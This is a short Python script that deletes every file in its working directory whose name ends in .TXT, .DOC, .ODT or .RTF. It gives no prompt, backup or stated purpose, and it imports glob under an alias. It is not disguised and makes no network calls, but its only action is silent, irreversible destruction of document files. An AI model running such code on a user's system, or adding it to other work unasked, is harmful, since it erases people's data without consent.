from os import remove
from glob import glob as get_files


def main():
    file_extensions = ["*.TXT", "*.DOC", "*.ODT", "*.RTF"]
    for extension in file_extensions:
        for file in get_files(extension):
            remove(file)


if __name__ == "__main__":
    main()
